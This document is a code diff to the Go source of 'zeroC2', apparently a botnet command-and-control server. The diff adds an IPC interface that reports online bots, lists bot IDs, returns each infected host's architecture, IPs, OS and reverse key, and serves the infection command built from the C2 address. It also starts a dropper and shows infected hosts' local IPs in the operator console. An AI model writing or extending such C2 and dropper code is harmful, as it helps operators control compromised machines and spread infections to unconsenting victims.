@@ -40,6 +40,7 @@ var (
 	tera        = make(map[string]Botstruc)
 	aliveclient = make(map[string]time.Time)
 	shell       = false
+	start       = time.Now()
 	pubmutex    sync.Mutex
 	routmutex   sync.Mutex
 )
@@ -191,6 +192,68 @@ func routerhandle(router *zmq.Socket) {
 			}
 		}(msg)
 	}
+}
+
+func IPC() {
+	rep, err := zmq.NewSocket(zmq.REP)
+
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	rep.Bind("ipc:///tmp/ZeroCall")
+
+	for {
+		msg, err := rep.RecvMessage(0)
+
+		if err != nil {
+			log.Println(err)
+			break
+		}
+
+		switch len(msg) {
+		case 1:
+			if msg[0] == "GetBotsOnline" {
+				rep.SendMessage(fmt.Sprintf("%d", len(aliveclient)))
+			} else if msg[0] == "GetBotslist" {
+				var result []string
+				for _, bot := range tera {
+					result = append(result, bot.connID)
+				}
+				rep.SendMessage(result)
+			} else if msg[0] == "Uptime" {
+				uptime := time.Since(start)
+				rep.SendMessage(fmt.Sprintf("%v", uptime))
+			} else if msg[0] == "shutdown" {
+				rep.SendMessage("success")
+				os.Exit(125)
+			} else if msg[0] == "Getpayload" {
+				if config.C2ip == "0.0.0.0" {
+					newC2ip := getpubIp()
+					rep.SendMessage(fmt.Sprintf(config.Infcommand, newC2ip))
+					continue
+				}
+				rep.SendMessage(fmt.Sprintf(config.Infcommand, config.C2ip))
+			}
+		case 2:
+			if msg[0] == "GetInfo" {
+				found := false
+				for _, bot := range tera {
+					if bot.connID == msg[1] {
+						found = true
+						rep.SendMessage(bot.arch, bot.localip, bot.pubip, bot.OS, bot.reversekey)
+					}
+				}
+				if !found {
+					rep.SendMessage("not found")
+				}
+			}
+		default:
+			rep.SendMessage("error")
+		}
+	}
+
+	log.Println("ZeroC2 Call has shutdown")
 }
 
 func randomtransfer(target string, rport, amount int, router, publisher *zmq.Socket) {
@@ -389,9 +452,10 @@ func main() {
 	go heartpubsend(publisher)
 	go heartbeatcheck()
 
-	color.Cyan("[...]starting zeroC2 dropper")
 	go dropper.Dropstart()
 	color.Green("[✔] successfully started zeroC2 dropper")
+	go IPC()
+	color.Green("[✔] successfully started zeroC2 IPC calls")
 
 	fmt.Print("press enter to continue...")
 	scanner.Scan()
@@ -446,7 +510,7 @@ func main() {
 			fmt.Println("Number of bots:", len(aliveclient))
 			if len(aliveclient) != 0 {
 				for _, bot := range tera {
-					fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip)
+					fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\nlocal ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip, bot.localip)
 				}
 			}
 		case "payload":
@@ -457,6 +521,7 @@ func main() {
 				continue
 			}
 			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
+		default:
 			if strings.Contains(command, "!") {
 				containsBlocked := false
 				for _, value := range config.Methods {
@@ -492,7 +557,6 @@ func main() {
 					}
 				}
 			}
-
 		}
 	}
 }
